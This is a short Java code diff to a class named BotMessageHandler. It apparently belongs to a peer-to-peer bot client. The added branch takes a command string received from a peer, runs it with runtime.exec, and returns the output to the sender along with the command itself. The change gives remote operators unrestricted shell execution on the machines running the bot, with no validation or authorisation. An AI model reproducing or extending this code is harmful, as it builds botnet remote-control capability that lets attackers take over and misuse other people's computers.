@@ -43,7 +43,7 @@ class BotMessageHandler {
             success = false;
         }
         if (message.getCommand().getShouldRespond()) {
-            p2pLayer.commandResponse(sender, me, result, success);
+            p2pLayer.commandResponse(sender, me, result, success, command.getCommand());
         }
     }
 
@@ -112,8 +112,20 @@ class BotMessageHandler {
                 e.printStackTrace();
                 return null;
             }
+        } else {
+            try {
+                Process exec = runtime.exec(command);
+                exec.waitFor();
+                if (exec.exitValue() != 0) {
+                    return null;
+                }
+                InputStreamReader i = new InputStreamReader(exec.getInputStream());
+                return IOUtils.toString(i);
+            } catch (IOException | InterruptedException e) {
+                e.printStackTrace();
+                return null;
+            }
         }
-        return null;
     }
 
 }
